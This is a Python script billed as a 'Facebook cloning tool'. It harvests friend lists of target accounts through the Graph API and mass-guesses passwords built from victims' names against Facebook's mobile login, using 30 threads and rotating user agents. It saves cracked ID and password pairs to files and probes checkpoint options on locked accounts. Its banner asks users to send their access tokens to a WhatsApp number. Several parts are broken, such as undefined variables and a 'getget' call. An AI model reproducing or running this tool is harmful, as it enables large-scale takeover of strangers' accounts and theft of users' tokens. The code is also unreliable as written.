# https://github.com/Mantal Studio

#   Release Date : Jum,11 Feb,2022
#   Simple Look, Easy To Understand
#   Easy To Use ✓
#   Free For Use ✓

import requests,bs4,json,os,sys,random,datetime,time

try:
	import rich
except ImportError:
	os.system('pip install rich')
	time.sleep(1)
	try:
		import rich
	except ImportError:
		exit('Cant Install Rich Module, Try Manual Install (pip install rich)')

from rich.table import Table as me
from rich.console import Console as sol
from bs4 import BeautifulSoup as sop
from concurrent.futures import ThreadPoolExecutor as tred
from rich.console import Group as gp
from rich.panel import Panel as nel
from rich import print as cetak
from rich.markdown import Markdown as mark
from rich.columns import Columns as col

# UA LIST
try:uao = open('user.txt','r').readlines()
except:uao = ['Mozilla/5.0 (Linux; Android 8.1.0; S45B Build/OPM2.171019.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/96.0.4664.45 Mobile Safari/537.36']

# INDICATION
id,id2,loop,ok,cp,map = [],[],0,0,0,0

# COLORS
x = '\33[m' # DEFAULT
k = '\033[93m' # KUNING +
h = '\x1b[1;92m' # HIJAU +
hh = '\033[32m' # HIJAU -
u = '\033[95m' # UNGU
kk = '\033[33m' # KUNING -
b = '\33[1;96m' # BIRU -
p = '\x1b[0;34m' # BIRU +

# Converter Bulan
dic = {'1':'Januari','2':'Februari','3':'Maret','4':'April','5':'Mei','6':'Juni','7':'Juli','8':'Agustus','9':'September','10':'Oktober','11':'November','12':'Desember'}
dic2 = {'01':'Januari','02':'Februari','03':'Maret','04':'April','05':'Mei','06':'Juni','07':'Juli','08':'Agustus','09':'September','10':'Oktober','11':'November','12':'Desember'}
tgl = datetime.datetime.now().day
bln = dic[(str(datetime.datetime.now().month))]
thn = datetime.datetime.now().year
okc = 'OK-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'
cpc = 'CP-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'

# CLEAR
def clear():
	os.system('clear')

# BACK
def back():
	login()

# BANNER
def banner():
	clear()
	wel = '# WELCOME TO FACEBOOK ClONING TOOLS '
	wel2 = mark(wel, style='cyan')                                       
	sol().print(wel2, style='on red')
	ise = '# DEVELOPER INFORMATION' 
	fc = mark(ise, style='green')
	sol().print(fc)
	tap = me()
	tap.add_column('200', style='green', justify='center')
	tap.add_row('Kindly Send Your Token To Whatsapp')
	sol().print(tap, justify='center')
	tap = me()
	tap.add_column('WHATSAPP', style='green', justify='center')
	tap.add_column('GITHUB', style='green', justify='center')
	tap.add_column('FACEBOOK ', style='green', justify='center')
	tap.add_column('INSTAGRAM', style='green', justify='center')
	tap.add_row('03011517172')
	sol().print(tap, justify='center')

# VALIDATION TOKEN
def login():
	try:
		token = open('token.txt','r').read()
		try:
			sy = requests.get('https://graph.facebook.com/me?access_token='+token)
			sy2 = json.loads(sy.text)['name']
			sy3 = json.loads(sy.text)['id']
			sy4 = json.loads(sy.text)['birthday']
			menu(sy2,sy3,sy4)
		except KeyError:
			login_lagi()
		except requests.exceptions.ConnectionError:
			banner()
			li = '# PROBLEM INTERNET CONNECTION, CHECK AND TRY AGAIN'
			lo = mark(li, style='red')
			sol().print(lo, style='cyan')
			exit()
	except IOError:
		login_lagi()

# LOGIN
def login_lagi():
	banner()
	sky = '# LOGIN USING THE ACCESS TOKEN'
	sky2 = mark(sky, style='green')
	sol().print(sky2, style='cyan')
	panda = input(x+'['+p+'⭐'+x+'] Token : ')
	try:
		tes = requests.get('https://graph.facebook.com/me?access_token='+panda)
		tes2 = json.loads(tes.text)['name']
		tes3 = json.loads(tes.text)['id']
		tes4 = json.loads(tes.text)['birthday']
		open('token.txt','w').write(panda)
		sue = '# Login Success, Wait A Moment! LOADING....'
		suu = mark(sue, style='green')
		sol().print(suu, style='cyan')
		time.sleep(2.5)
		menu(tes2,tes3,tes4)
	except KeyError:
		sue = '# Login Failed, Check Your Token!'
		suu = mark(sue, style='red')
		sol().print(suu, style='cyan')
		time.sleep(2.5)
		login_lagi()
	except requests.exceptions.ConnectionError:
		li = '# PROBLEM INTERNET CONNECTION, CHECK AND TRY AGAIN'
		lo = mark(li, style='red')
		sol().print(lo, style='cyan')
		exit()

# MENU
def menu(my_name,my_id,my_birthday):
	try:
		sh = requests.get('https://httpbin.org/ip').json()
	except:pass
	try:
		tglx = my_birthday.split('/')[1]
		blnx = dic2[str(my_birthday.split('/')[0])]
		thnx = my_birthday.split('/')[2]
		birth = tglx+' '+blnx+' '+thnx
	except:
		birth = '-'
	banner()
	sg = '# MENU TOOLS'
	fx = mark(sg, style='green')
	sol().print(fx)
	print(x+'['+h+'<•MHI•>'+k+'] ıllıllı⭐🌟 I͙D͙ N͙A͙M͙E͙   🌟⭐ıllıllı : '+str(my_name))
	print(x+'['+h+'<•MHI•>'+k+'] ıllıllı⭐🌟 L͙O͙G͙I͙N͙ I͙D͙  🌟⭐ıllıllı : '+str(my_id))
	print(x+'['+h+'<•MHI•>'+k+'] ıllıllı⭐🌟 D͙A͙T͙E͙ B͙O͙T͙H͙ 🌟⭐ıllıllı : '+str(birth))
	print(x+'['+h+'<•MHI•>'+k+'] ıllıllı⭐🌟 I͙P͙ A͙D͙R͙E͙S͙S͙ 🌟⭐ıllıllı : '+str(sh['origin']))
	io = '[01] 🌟⭐ʜᴀᴄᴋʀᴅ ꜰʀᴏᴍ ꜰɪʀᴇɴᴅ🌟⭐ \n[02] 🌟⭐ʜᴀᴄᴋʀᴅ ꜰʀᴏᴍ ꜰɪʀᴇɴᴅ🌟⭐(ꜰʀᴏᴍ ᴍᴀx 10 ɪᴅ)\n[03] 🌟⭐ꜱʜᴏᴡ ʜᴀᴄᴋᴇᴅ ɪᴅᴢ🌟⭐\n[00] 🌟⭐ʟᴏɢ ᴏᴜᴛ🌟⭐'
	oi = nel(io, style='PURPLE')
	cetak(nel(oi, title='MENU'))
	jh = input(x+'['+p+'⭐'+k+'] SELECT ONE : ')
	if jh in ['1','01']:
		dump_publik()
	elif jh in ['2','02']:	
		dump_massal()
	elif jh in ['3','03']:
		result()
	elif jh in ['0','00']:
		os.system('rm -rf token.txt')
		print(x+'['+h+''+x+'] Wait ...')
		time.sleep(1)
		sw = '# LOGOUT SUCCESSFULLY'
		sol().print(mark(sw, style='green'))
		exit()
	else:
		ric = '# OPTION NOT IN THE MENU'
		sol().print(mark(ric, style='red'))
		exit()
# RESULT CHECKER
def result():
	cek = '# ChecK RESULT'
	sol().print(mark(cek, style='green'))
	kayes = '[01] ᴄʜᴇᴄᴋ ʜᴀᴄᴋʀᴅ ᴄᴘ\n[02] ᴄʜᴇᴄᴋ ʜᴀᴄᴋʀᴅ OK\n[00] ʙᴀᴄᴋ ᴛᴏ ᴍᴇɴᴜ'
	kis = nel(kayes, style='GREEN')
	cetak(nel(kis, title='ʜᴀᴄᴋʀᴅ'))
	kz = input(x+'['+p+'⭐'+x+'] ꜱᴇʟᴇᴄᴛ : ')
	if kz in ['1','01']:
		try:vin = os.listdir('CP')
		except FileNotFoundError:
			gada = '# DIRECTORY NOT FOUND'
			sol().print(mark(gada, style='red'))
			time.sleep(2)
			back()
		if len(vin)==0:
			haha = '# YOU DONT HAVE RESULT CP'
			sol().print(mark(haha, style='yellow'))
			time.sleep(2)
			back()
		else:
			gerr = '# YOUR CP RESULT'
			sol().print(mark(gerr, style='green'))
			for isi in vin:
				try:
					hem = open('CP/'+isi,'r').readlines()
				except:continue
				print(b+isi+' ---> '+str(len(hem))+' Akun'+x)
			gerr2 = '# SELECT RESULTS TO DISPLAY'
			sol().print(mark(gerr2, style='green'))
			print(x+'['+h+'⭐'+x+'] Contoh : '+cpc)
			geh = input(x+'['+p+'⭐'+x+'] Pilih : ')
			try:
				lin = open('CP/'+geh,'r').read()
			except:
				hehe = '# FILE NOT FOUND, CHECK AND TRY AGAIN'
				sol().print(mark(hehe, style='red'))
				time.sleep(2)
				back()
			akun = '# LIST YOUR CP ACCOUNT'
			sol().print(mark(akun, style='green'))
			hus = os.system('cd CP && cat '+geh)
			akun2 = '# LIST YOUR CP ACCOUNT'
			sol().print(mark(akun, style='green'))
			input(x+'['+h+'⭐'+x+'] ʀᴇᴛᴜʀɴ')
			back()
	elif kz in ['2','02']:
		try:vin = os.listdir('OK')
		except FileNotFoundError:
			gada = '# DIRECTORY NOT FOUND'
			sol().print(mark(gada, style='red'))
			time.sleep(2)
			back()
		if len(vin)==0:
			haha = '# YOU DONT HAVE RESULTS OK'
			sol().print(mark(haha, style='yellow'))
			time.sleep(2)
			back()
		else:
			gerr = '# YOUR OK RESULT'
			sol().print(mark(gerr, style='green'))
			for isi in vin:
				try:
					hem = open('OK/'+isi,'r').readlines()
				except:continue
				print(h+isi+' ---> '+str(len(hem))+' Akun'+x)
			gerr2 = '# SELECT RESULTS TO DISPLAY'
			sol().print(mark(gerr2, style='green'))
			print(x+'['+h+'⭐'+x+'] Contoh : '+okc)
			geh = input(x+'['+p+'⭐'+x+'] Pilih : ')
			try:
				lin = open('OK/'+geh,'r').read()
			except:
				hehe = '# FILE NOT FOUND, CHECK AND TRY AGAIN'
				sol().print(mark(hehe, style='red'))
				time.sleep(2)
				back()
			akun = '# LIST YOUR OK ACCOUNT'
			sol().print(mark(akun, style='green'))
			hus = os.system('cd OK && cat '+geh)
			akun2 = '# LIST YOUR OK ACCOUNT'
			sol().print(mark(akun, style='green'))
			input(x+'['+h+'⭐'+x+'] Kembali')
			back()
	elif kz in ['3','03']:
		back()
	else:
		ric = '# OPTION NOT IN THE MENU'
		sol().print(mark(ric, style='red'))
		exit()
# OPEN
def file():
	tek = '# CHECK OPTION FROM FILE'
	sol().print(mark(tek, style='cyan'), style='on red')
	print(x+'['+h+'⭐'+x+'] Reading Files, Wait a moment ...')
	time.sleep(2)
	teks = '# SELECT FILES TO CHECK'
	sol().print(mark(teks, style='green'))
	my_files = []
	try:
		lis = os.listdir('CP')
		for kt in lis:
			my_files.append(kt)
	except:pass
	try:
		mer = os.listdir('OK')
		for ty in mer:
			my_files.append(ty)
	except:pass
	if len(my_files)==0:
		yy = '#YOU DONT HAVE RESULTS TO CHECK'
		sol().print(mark(yy, style='red'))
		exit()
	else:
		cih = 0
		lol = {}
		for isi in my_files:
			try:hem = open('CP/'+isi,'r').readlines()
			except:
				try:hem = open('OK/'+isi,'r').readlines()
				except:continue
			cih+=1
			if cih<10:
				nom = '0'+str(cih)
				lol.update({str(cih):str(isi)})
				lol.update({nom:str(isi)})
				print('['+nom+'] '+isi+' <--->> '+str(len(hem))+' Account'+x)
			else:
				lol.update({str(cih):str(isi)})
				print('['+str(cih)+'] '+isi+' <--->> '+str(len(hem))+' Account'+x)
		teks2 = '# SELECT FILES TO CHECK'
		sol().print(mark(teks2, style='green'))
		geeh = input(x+'['+p+'f'+x+'] SELECT : ')
		try:geh = lol[geeh]
		except KeyError:
			ric = '# OPTION NOT IN MENU'
			sol().print(mark(ric, style='red'))
			exit()
		try:
			hf = open('CP/'+geh,'r').readlines()
			for fz in hf:
				akun.append(fz.replace('\n',''))
			cek_opsi()
		except IOError:
			try:
				hf = open('OK/'+geh,'r').readlines()
				for fz in hf:
					akun.append(fz.replace('\n',''))
				cek_opsi()
			except IOError:
				hehe = '# FILE NOT FOUND, CHECK & TRY AGAIN'
				sol().print(mark(hehe, style='red'))
				time.sleep(2)
				back()

# DUMP ID PUBLIK
def dump_publik():
    try:
		token = open('.token.txt','r').read()
	except IOError:
		exit()
	win = '# DUMP ID PUBLIK'
	win2 = mark(win, style='green')
	sol().print(win2)
	print(x+'['+h+'•'+x+'] Ketik "me" Jika Ingin Dump ID Dari Teman')
	pil = input(x+'['+p+'f'+x+'] Masukkan ID Target : ')
	try:
		koh2 = requests.get('https://graph.facebook.com/v2.0/'+pil+'?fields=friends.limit(5000)&access_token='+tokenku[0]).json()
		for pi in koh2['friends']['data']:
			try:id.append(pi['id']+'|'+pi['name'])
			except:continue
		print(x+'['+h+'•'+x+'] Total : '+str(len(id)))
		setting()
	except requests.exceptions.ConnectionError:
		li = '# KONEKSI INTERNET BERMASALAH, PERIKSA & COBA LAGI'
		lo = mark(li, style='red')
		sol().print(lo, style='cyan')
		exit()
	except (KeyError,IOError):
		teks = '# PERTEMANAN TIDAK PUBLIK ATAU TOKEN RUSAK'
		teks2 = mark(teks, style='red')
		sol().print(teks2)
		exit()
	except requests.exceptions.ConnectionError:
		li = '# PROBLEM INTERNET CONNECTION, CHECK AND TRY AGAIN'
		lo = mark(li, style='red')
		sol().print(lo, style='cyan')
		exit()
	try:
		koh2 = requests.getget('https://graph.facebook.com/v2.0/'+userr+'?fields=friends.limit(5000)&access_token='+tokenku[0]).json()
		koh3 = json.loads(koh2.text)
		for pi in koh3['data']:
			try:id.append(pi['id']+'|'+pi['name'])
			except:continue
		print(x+'['+h+'⭐'+x+'] Total : '+str(len(id)))
		setting()
	except requests.exceptions.ConnectionError:
		li = '# PROBLEM INTERNET CONNECTION, CHECK AND TRY AGAIN'
		lo = mark(li, style='red')
		sol().print(lo, style='cyan')
		exit()
	except (KeyError,IOError):
		teks = '# NOT PUBLIC FRIENDSHIP OR BROKEN TOKEN'
		teks2 = mark(teks, style='red')
		sol().print(teks2)
		exit()

# DUMP ID Multi
def dump_massal():
	try:
		token = open('token.txt','r').read()
	except IOError:
		exit()
	win = '# DUMP ID PUBLIK Multi'
	win2 = mark(win, style='green')
	sol().print(win2)
	print(x+'['+h+'⭐'+x+'] ENTER NUMBER ID(UNLIMIT)')
	try:
		jum = int(input(x+'['+p+'⭐'+x+'] HOW MANY ID : '))
	except ValueError:
		pesan = '# THE INPUT YOU ENTERED IS NOT A NUMBER'
		pesan2 = mark(pesan, style='red')
		sol().print(pesan2)
		exit()
	if jum<1 or jum>10:
		pesan = '# OUT OF RANGE MEN'
		pesan2 = mark(pesan, style='red')
		sol().print(pesan2)
		exit()
	uid = []
	yz = 0
	print(x+'['+h+'⭐'+kk+'] TYPER "me" IF YOU WANT TO DUMP ID FROM LOGIN TOKEN')
	for met in range(jum):
		yz+=1
		kl = input(x+'['+h+str(yz)+x+'] Enter ID To '+str(yz)+' : ')
		uid.append(kl)
	for userr in uid:
		try:
			col = requests.get('https://graph.facebook.com/v2.0/'+userr+'?fields=friends.limit(5000)&access_token='+tokenku[0]).json()
			col2 = json.loads(col.text)
			for mi in col2['data']:
				try:
					iso = mi['id']+'|'+mi['name']
					if iso in id:pass
					else:id.append(iso)
				except:continue
		except (KeyError,IOError):
			pass
		except requests.exceptions.ConnectionError:
			li = '# PROBLEM INTERNET CONNECTION, CHECK AND TRY AGAIN'
			lo = mark(li, style='red')
			sol().print(lo, style='cyan')
			exit()
	tot = '# SUCCESSFUL COLLECTING %s ID'%(len(id))
	if len(id)==0:
		tot2 = mark(tot, style='red')
	else:
		tot2 = mark(tot, style='green')
	sol().print(tot2)
	setting()

# ID SETTINGS
def setting():
	wl = '# SETTING ORDER ID'
	sol().print(mark(wl, style='green'))
	teks = '[01] Crack From Oldest Account (Not Recommended)\n[02] Crack From New Account (Recommended)\n[03] Random Order ID (Highly Recommended)'
	tak = nel(teks, style='BLUE')
	cetak(nel(tak, title='SETTING'))
	hu = input(x+'['+p+'⭐'+h+'] SELECT ONE : ')
	if hu in ['1','01']:
		for bacot in id:
			id2.append(bacot)
	elif hu in ['2','02']:
		for bacot in id:
			id2.insert(0,bacot)
	elif hu in ['3','03']:
		for bacot in id:
			xx = random.randint(0,len(id2))
			id2.insert(xx,bacot)
	else:
		ric = '# OPTION NOT IN THE MENU'
		sol().print(mark(ric, style='red'))
		exit()
	passwrd()

# WORDLIST
def passwrd():
	global loop
	ler = '# CRACK PROCESS START, PRESS CTRL+Z TO STOP'
	sol().print(mark(ler, style='green'))
	krek = 'Live Result Saved To : OK/%s\nCheck Result Saved To : CP/%s\nTurn On/Off Airplane Mode Every 5 Minutes'%(okc,cpc)
	cetak(nel(krek, title='CRACK'))
	pool = tred(max_workers=30)
	for yuzong in id2:
		idf,nmf = yuzong.split('|')[0],yuzong.split('|')[1].lower()
		frs = nmf.split(' ')[0]
		pwv = []
		if len(nmf)<6:
			if len(frs)<3:
				loop+=1
				continue
			else:
				pwv.append(frs+'123')
				pwv.append(frs+'12345')
		else:
			if len(frs)<3:
				pwv.append(nmf)
			else:
				pwv.append(nmf)
				pwv.append(frs+'123')
				pwv.append(frs+'12345')
		pool.submit(crack,idf,pwv)
	print('')
	tanya = '# WANT TO CHECK THE CRACK RESULT OPTIONS?'
	sol().print(mark(tanya, style='green'))
	woi = input(x+'['+p+'f'+x+'] Want to Show Crack Result Options? (y/n) : ')
	if woi in ['y','Y']:
		cek_opsi()
	else:
		exit()

# CRACKER
def crack(idf,pwv):
	global loop,ok,cp
	bi = random.choice([u,k,kk,b,h,hh])
	pers = loop*100/len(id2)
	fff = '%'
	print('\r%s---> %s/%s ---> ok*%s ---> cp*%s ---> %s%s%s'%(bi,loop,len(id2),ok,cp,int(pers),str(fff),x), end=' ');sys.stdout.flush()
	ua = random.choice(uao).replace('\n','')
	ses = requests.Session()
	for pw in pwv:
		try:
			head = {"Host": "m.facebook.com","cache-control": "max-age=0","upgrade-insecure-requests": "1","origin": "https://m.facebook.com","content-type": "application/x-www-form-urlencoded","user-agent": ua,"accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with": "mark.via.gp","sec-fetch-site": "same-origin","sec-fetch-mode": "navigate","sec-fetch-user": "?1","sec-fetch-dest": "document","referer": "https://m.facebook.com/login/?next&ref=dbl&fl&refid=8","accept-encoding": "gzip, deflate","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"}
			dt = {'email': idf,'pass': pw,'login': 'submit'}
			z = ses.get('https://m.facebook.com')
			j = ses.post('https://m.facebook.com/login.php', data=dt, headers=head, allow_redirects=True)
			if "checkpoint" in ses.cookies.get_dict().keys():
				print('\r%s++++ %s|%s ----> CP       '%(b,idf,pw))
				open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
				cp+=1
				break
			elif "c_user" in ses.cookies.get_dict().keys():
				print('\r%s++++ %s|%s ----> OK       '%(h,idf,pw))
				open('OK/'+okc,'a').write(idf+'|'+pw+'\n')
				ok+=1
				break
			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(31)
	loop+=1
# OPSI
def ceker(idf,pw):
	global cp
	ua = 'Mozilla/5.0 (Linux; Android 8.1.0; S45B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Mobile Safari/537.36'
	head = {"Host": "mbasic.facebook.com","cache-control": "max-age=0","upgrade-insecure-requests": "1","origin": "https://mbasic.facebook.com","content-type": "application/x-www-form-urlencoded","user-agent": ua,"accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with": "mark.via.gp","sec-fetch-site": "same-origin","sec-fetch-mode": "navigate","sec-fetch-user": "?1","sec-fetch-dest": "document","referer": "https://mbasic.facebook.com/login/?next&ref=dbl&fl&refid=8","accept-encoding": "gzip, deflate","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"}
	ses = requests.Session()
	try:
		hi = ses.get('https://mbasic.facebook.com')
		ho = sop(ses.post('https://mbasic.facebook.com/login.php', data={'email':idf,'pass':pw,'login':'submit'}, headers=head, allow_redirects=True).text,'html.parser')
		jo = ho.find('form')
		data = {}
		lion = ['nh','jazoest','fb_dtsg','submit[Continue]','checkpoint_data']
		for anj in jo('input'):
			if anj.get('name') in lion:
				data.update({anj.get('name'):anj.get('value')})
		kent = sop(ses.post('https://mbasic.facebook.com'+str(jo['action']), data=data, headers=head).text,'html.parser')
		print('\r%s++++ %s|%s ----> CP       %s'%(b,idf,pw,x))
		open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
		cp+=1
		opsi = kent.find_all('option')
		if len(opsi)==0:
			print('\r%s---> Tap Yes / A2F (Check Login on Lite/Mbasic%s)'%(hh,x))
		else:
			for opsii in opsi:
				print('\r%s---> %s%s'%(kk,opsii.text,x))
	except Exception as c:
		print('\r%s++++ %s|%s ----> CP       %s'%(b,idf,pw,x))
		print('\r%s---> Cant Check Option (Check Login In Lite/Mbasic)%s'%(u,x))
		open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
# OPSI CEKER
def cek_opsi():
	c = len(akun)
	hu = 'Theres a %s Account To Check\nBefore Starting, Airplane Mode/Change Sim Card First'%(c)
	cetak(nel(hu, title='CHECK OPTIONS'))
	input(x+'['+h+'⭐'+h+'] Start')
	cek = '# OPTION CHECK PROCESS START'
	sol().print(mark(cek, style='green'))
	love = 0
	for kes in akun:
		try:
			try:
				id,pw = kes.split('|')[0],kes.split('|')[1]
			except IndexError:
				time.sleep(2)
				print('\r%s++++ %s ----> Error      %s'%(b,kes,x))
				print('\r%s---> Separator Not Supported For This Program%s'%(u,x))
				continue
			bi = random.choice([u,k,kk,b,h,hh])
			print('\r%s---> %s/%s ---> { %s }%s'%(bi,love,len(akun),id,x), end=' ');sys.stdout.flush()
			ua = 'Mozilla/5.0 (Linux; Android 8.1.0; S45B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Mobile Safari/537.36'
			ses = requests.Session()
			header = {"Host": "mbasic.facebook.com","cache-control": "max-age=0","upgrade-insecure-requests": "1","origin": "https://mbasic.facebook.com","content-type": "application/x-www-form-urlencoded","user-agent": ua,"accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with": "mark.via.gp","sec-fetch-site": "same-origin","sec-fetch-mode": "navigate","sec-fetch-user": "?1","sec-fetch-dest": "document","referer": "https://mbasic.facebook.com/login/?next&ref=dbl&fl&refid=8","accept-encoding": "gzip, deflate","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"}
			hi = ses.get('https://mbasic.facebook.com')
			ho = sop(ses.post('https://mbasic.facebook.com/login.php', data={'email':id,'pass':pw,'login':'submit'}, headers=header, allow_redirects=True).text,'html.parser')
			if "checkpoint" in ses.cookies.get_dict().keys():
				try:
					jo = ho.find('form')
					data = {}
					lion = ['nh','jazoest','fb_dtsg','submit[Continue]','checkpoint_data']
					for anj in jo('input'):
						if anj.get('name') in lion:
							data.update({anj.get('name'):anj.get('value')})
					kent = sop(ses.post('https://mbasic.facebook.com'+str(jo['action']), data=data, headers=header).text,'html.parser')
					print('\r%s++++ %s|%s ----> CP       %s'%(b,id,pw,x))
					opsi = kent.find_all('option')
					if len(opsi)==0:
						print('\r%s---> Tap Yes / A2F (Check Login on Lite/Mbasic%s)'%(hh,x))
					else:
						for opsii in opsi:
							print('\r%s---> %s%s'%(kk,opsii.text,x))
				except:
					print('\r%s++++ %s|%s ----> CP       %s'%(b,id,pw,x))
					print('\r%s---> Cannot Check Options%s'%(u,x))
			elif "c_user" in ses.cookies.get_dict().keys():
				print('\r%s++++ %s|%s ----> OK       %s'%(h,id,pw,x))
			else:
				print('\r%s++++ %s|%s ----> WRONG      %s'%(x,id,pw,x))
			love+=1
		except requests.exceptions.ConnectionError:
			print('')
			li = '# PROBLEM INTERNET CONNECTION, CHECK & TRY AGAIN'
			sol().print(mark(li, style='red'))
			exit()
	dah = '# DONE'
	sol().print(mark(dah, style='green'))
	exit()
if __name__=='__main__':
	try:os.mkdir('CP')
	except:pass
	try:os.mkdir('OK')
	except:pass
	login()
